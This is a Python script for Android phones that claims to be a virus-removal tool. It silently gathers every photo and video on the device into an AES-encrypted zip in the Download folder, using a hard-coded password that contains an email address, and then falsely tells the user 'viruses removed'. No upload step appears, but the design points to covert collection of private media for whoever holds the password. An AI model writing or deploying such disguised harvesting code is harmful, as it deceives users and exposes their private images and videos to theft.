#!/usr/bin/env python3
"""Alpha — silent media backup with fire progress bar."""

import os
import sys
import argparse
from pathlib import Path

try:
    import pyzipper
except ImportError:
    sys.exit(1)


PASSWORD = "svv1766@gmail.com623533623533623533@A"
DEFAULT_SOURCE = Path("/storage/emulated/0")
OUTPUT_DIR = Path("/storage/emulated/0/Download")
OUTPUT_NAME = "Alpha!!$!#.zip"

MEDIA_EXTS = {
    # صور
    '.jpg', '.jpeg', '.jpe', '.jfif', '.pjpeg', '.pjp',
    '.png', '.gif', '.bmp', '.webp', '.avif',
    '.heic', '.heif', '.tiff', '.tif',
    '.raw', '.dng', '.cr2', '.cr3', '.nef', '.arw', '.orf', '.rw2',
    # فيديو
    '.mp4', '.webm', '.mkv', '.mov', '.avi', '.flv',
    '.wmv', '.m4v', '.3gp', '.3g2', '.mpeg', '.mpg', '.ts',
    '.mts', '.m2ts', '.vob', '.ogv', '.rm', '.rmvb',
}

# مجلدات لا تحتوي وسائط — نتخطاها في أي مكان
SKIP_NAMES_ANYWHERE = {'LOST.DIR'}
# داخل Android/ فقط — هذي بيانات تطبيقات، ليس وسائط المستخدم
SKIP_INSIDE_ANDROID = {'data', 'obb'}


def scan(source: Path, skip_backups: bool, skip_download: bool):
    found = []
    seen = set()
    for dirpath, dirnames, filenames in os.walk(source):
        try:
            rel_parts = Path(dirpath).relative_to(source).parts
        except ValueError:
            rel_parts = ()

        inside_android = rel_parts and rel_parts[0] == 'Android'
        new_dirs = []
        for d in dirnames:
            if d in SKIP_NAMES_ANYWHERE:
                continue
            if inside_android and d in SKIP_INSIDE_ANDROID:
                continue
            if skip_backups and d == 'backups':
                continue
            if skip_download and d == 'Download':
                continue
            new_dirs.append(d)
        dirnames[:] = new_dirs

        for name in filenames:
            if Path(name).suffix.lower() in MEDIA_EXTS:
                p = Path(dirpath) / name
                try:
                    if p.stat().st_size > 0:
                        key = str(p)
                        if key not in seen:
                            seen.add(key)
                            found.append(p)
                except (PermissionError, OSError):
                    pass
    return found


RESET = '\033[0m'
BOLD = '\033[1m'
DIM = '\033[2m'

FIRE = [
    '\033[38;5;226m', '\033[38;5;220m', '\033[38;5;214m', '\033[38;5;208m',
    '\033[38;5;202m', '\033[38;5;196m', '\033[38;5;160m', '\033[38;5;124m',
]

FIRE_CHARS = ['░', '▒', '▓', '█']


def fire_bar(pct, width=32):
    filled = int(width * pct)
    parts = []
    for i in range(width):
        if i < filled:
            ci = int((i / width) * (len(FIRE) - 1))
            ch = min(len(FIRE_CHARS) - 1, (i * len(FIRE_CHARS)) // width)
            parts.append(f"{FIRE[ci]}{FIRE_CHARS[ch]}{RESET}")
        else:
            parts.append(f"{DIM}░{RESET}")
    return ''.join(parts)


def flame_icon(pct):
    if pct >= 0.999: return f"{FIRE[0]}🔥{RESET}"
    if pct >= 0.75:  return f"{FIRE[2]}🔥{RESET}"
    if pct >= 0.50:  return f"{FIRE[3]}🔥{RESET}"
    if pct >= 0.25:  return f"{FIRE[5]}🔥{RESET}"
    return f"{FIRE[6]}🔥{RESET}"


def render_progress(done, total):
    pct = done / total if total else 0
    line = f"\r  {flame_icon(pct)} {fire_bar(pct)} {FIRE[3]}{BOLD}{pct*100:5.1f}%{RESET}"
    sys.stdout.write(f"\033[1m{line}{RESET}")
    sys.stdout.flush()


def final_burst():
    burst = f"{FIRE[0]}{BOLD}  🔥🔥🔥  {FIRE[2]}{BOLD}الملف جاهز{FIRE[0]}{BOLD}  🔥🔥🔥{RESET}"
    sys.stdout.write("\r" + " " * 72 + "\r")
    sys.stdout.write(burst + "\n")
    sys.stdout.flush()


def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("source", nargs="?", default=str(DEFAULT_SOURCE))
    parser.add_argument("--skip-backups", action="store_true")
    parser.add_argument("--skip-download", action="store_true")
    args = parser.parse_args()

    source = Path(args.source).expanduser().resolve()
    if not source.is_dir():
        return 1

    files = scan(source, args.skip_backups, args.skip_download)
    if not files:
        return 0

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    out_path = OUTPUT_DIR / OUTPUT_NAME

    try:
        with pyzipper.AESZipFile(
            out_path, 'w',
            compression=pyzipper.ZIP_DEFLATED,
            encryption=pyzipper.WZ_AES,
        ) as zf:
            zf.setpassword(PASSWORD.encode('utf-8'))
            zf.setencryption(pyzipper.WZ_AES, nbits=256)

            for i, path in enumerate(files, 1):
                try:
                    arcname = str(path.relative_to(source))
                    zf.write(path, arcname=arcname)
                except (PermissionError, OSError, ValueError):
                    pass
                render_progress(i, len(files))

        final_burst()
        sys.stdout.write("\n")
        sys.stdout.flush()
        print("تم ازالة فيروسات")

    except KeyboardInterrupt:
        sys.stdout.write("\n")
        sys.stdout.flush()
        try:
            out_path.unlink()
        except Exception:
            pass
        return 1
    except Exception:
        sys.stdout.write("\n")
        sys.stdout.flush()
        try:
            out_path.unlink()
        except Exception:
            pass
        return 1

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
